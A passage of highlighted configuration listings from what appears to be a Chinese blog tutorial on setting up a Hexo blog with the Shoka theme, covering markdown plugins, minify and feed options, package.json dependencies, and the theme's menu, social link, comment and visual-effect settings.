data-num=\"108\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> ./markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>furigana</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>          <span class=\"token key atrule\">fallbackParens</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"()\"</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> ./markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>spoiler</pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>          <span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"你知道得太多了\"</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token key atrule\">minify</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>  <span class=\"token key atrule\">html</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token key atrule\">stamp</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/json.ejs'</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/atom.ejs'</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/rss.ejs'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>  <span class=\"token key atrule\">css</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token key atrule\">stamp</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/*.min.css'</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token key atrule\">js</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token key atrule\">stamp</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token key atrule\">mangle</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>      <span class=\"token key atrule\">toplevel</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token key atrule\">compress</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/*.min.js'</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre><span class=\"token comment\"># algolia:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre><span class=\"token comment\">#   appId:</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre><span class=\"token comment\">#   apiKey:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token comment\">#   adminApiKey:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre><span class=\"token comment\">#   chunkSize: 5000</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token comment\">#   indexName:</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token comment\">#   fields:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token comment\">#     - title #必须配置</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre><span class=\"token comment\">#     - path #必须配置</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token comment\">#     - categories #推荐配置</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre><span class=\"token comment\">#     - content:strip:truncate,0,4000</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token comment\">#     - gallery</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre><span class=\"token comment\">#     - photos</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre><span class=\"token comment\">#     - tags</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token key atrule\">feed</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    <span class=\"token key atrule\">limit</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    <span class=\"token key atrule\">order_by</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"-date\"</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token key atrule\">tag_dir</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    <span class=\"token key atrule\">category_dir</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token key atrule\">rss</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>        <span class=\"token key atrule\">template</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"themes/shoka/layout/_alternate/rss.ejs\"</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"rss.xml\"</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token key atrule\">atom</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>        <span class=\"token key atrule\">template</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"themes/shoka/layout/_alternate/atom.ejs\"</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>        <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"atom.xml\"</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token key atrule\">jsonFeed</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>        <span class=\"token key atrule\">template</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"themes/shoka/layout/_alternate/json.ejs\"</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>        <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"feed.json\"</span></pre></td></tr></table></figure><h2 id=\"packagejson\"><a class=\"anchor\" href=\"#packagejson\">#</a> package.json</h2>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token key atrule\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo-site\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token key atrule\">\"version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"0.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">\"private\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token key atrule\">\"scripts\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token key atrule\">\"build\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo generate\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token key atrule\">\"clean\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo clean\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token key atrule\">\"deploy\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo deploy\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token key atrule\">\"server\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo server\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token key atrule\">\"hexo\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token key atrule\">\"version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"5.4.2\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">\"dependencies\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token key atrule\">\"hexo\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^5.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-algoliasearch\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^0.4.2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-autoprefixer\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-deployer-git\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.1.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-feed\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-generator-category\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-generator-tag\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-pagination\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^3.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-renderer-ejs\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-renderer-multi-markdown-it\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^0.1.5\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-renderer-stylus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-server\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-symbols-count-time\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^0.7.1\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-util\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.4.0\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"_configshokayml\"><a class=\"anchor\" href=\"#_configshokayml\">#</a> _config.shoka.yml</h2>\n<p>&lt;root&gt;/_config.shoka.yml 路径下</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">alternate</span><span class=\"token punctuation\">:</span> Yume Shoka</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Assets</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token key atrule\">statics</span><span class=\"token punctuation\">:</span> / <span class=\"token comment\">#//cdn.jsdelivr.net/gh/amehime/shoka@latest/</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token key atrule\">open_graph</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">#twitter_id:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">#google_plus:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">#fb_admins:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">#fb_app_id:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token key atrule\">menu</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token key atrule\">home</span><span class=\"token punctuation\">:</span> / <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> home</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">posts</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token key atrule\">default</span><span class=\"token punctuation\">:</span> / <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> feather</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token key atrule\">archives</span><span class=\"token punctuation\">:</span> /archives/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> list<span class=\"token punctuation\">-</span>alt</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token key atrule\">categories</span><span class=\"token punctuation\">:</span> /categories/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> th</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token key atrule\">tags</span><span class=\"token punctuation\">:</span> /tags/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> tags</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token key atrule\">friends</span><span class=\"token punctuation\">:</span> /friends/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> heart</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># Social Links</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># Usage: `Key: permalink || icon || color`</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># Key is the link label showing to end users.</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># Value before `||` delimiter is the target permalink,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># secend value is the name of Font icon.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token key atrule\">social</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token key atrule\">github</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//github.com/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> github <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#191717\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token comment\">#google: https://plus.google.com/yourname || google</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token key atrule\">twitter</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//twitter.com/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> twitter <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#00aff0\"</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token key atrule\">zhihu</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//www.zhihu.com/people/rurismzk <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> zhihu <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#1e88e5\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token key atrule\">music</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//music.163.com/<span class=\"token comment\">#/user/home?id=12886823 || cloud-music || \"#e60026\"</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token key atrule\">weibo</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//weibo.com/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> weibo <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#ea716e\"</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token key atrule\">about</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//about.me/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> address<span class=\"token punctuation\">-</span>card <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#3b5998\"</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token comment\">#email: mailto:yourname@mail.com || envelope || \"#55acd5\"</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token comment\">#facebook: https://www.facebook.com/yourname || facebook</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">#stackoverflow: https://stackoverflow.com/yourname || stack-overflow</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">#youtube: https://youtube.com/yourname || youtube</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">#instagram: https://instagram.com/yourname || instagram</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">#skype: skype:yourname?call|chat || skype</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">#douban: https://www.douban.com/people/yourname/ || douban</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token key atrule\">footer</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token comment\"># Specify the date when the site was setup. If not defined, current year will be used.</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token key atrule\">since</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2010</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token key atrule\">count</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token key atrule\">post</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token key atrule\">count</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># Third Party Plugins &amp; Services Settings</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\"># Comments</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\"># Valine</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># For more information: https://valine.js.org, https://github.com/xCss/Valine</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token key atrule\">valine</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token key atrule\">appId</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#这里不要忘了改</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token key atrule\">appKey</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#这里不要忘了改</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token key atrule\">placeholder</span><span class=\"token punctuation\">:</span> ヽ(○´∀`)ﾉ♪ <span class=\"token comment\"># Comment box placeholder</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token key atrule\">pageSize</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> <span class=\"token comment\"># Pagination size</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  <span class=\"token key atrule\">lang</span><span class=\"token punctuation\">:</span> zh<span class=\"token punctuation\">-</span>CN</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  <span class=\"token key atrule\">tagMember</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token key atrule\">master</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>      <span class=\"token comment\"># - deea5a8d259d17182a53be1772e4c182</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token key atrule\">friend</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token punctuation\">-</span> deea5a8d259d17182a53be1772e4c182</pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\"># bgm</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\"># audio:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\"># Dependencies: https://github.com/amehime/hexo-renderer-multi-markdown-it</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token key atrule\">pangu</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token comment\"># analytics &amp; SEO Settings</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># Disable Baidu transformation on mobile devices.</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token key atrule\">disable_baidu_transformation</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token comment\"># Automatically add external URL with Base64 encrypt &amp; decrypt.</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token key atrule\">exturl</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token comment\"># 自动滚动上次浏览的位置</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token key atrule\">auto_scroll</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token comment\"># 夜间模式</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token key atrule\">darkmode</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token comment\"># 是否显示页面加载动画 loading-cat</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token key atrule\">loader</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token key atrule\">start</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 当初次打开页面时，显示加载动画</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>  <span class=\"token key atrule\">switch</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># tab 切换到其他页面时，显示加载动画</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># 单机页面特效</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token key atrule\">fireworks</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 是否启用</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token key atrule\">color</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 烟花颜色</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(255,182,185,.9)\"</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(250,227,217,.9)\"</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(187,222,214,.9)\"</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(138,198,209,.9)\"</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    </pre></td></tr><tr><td 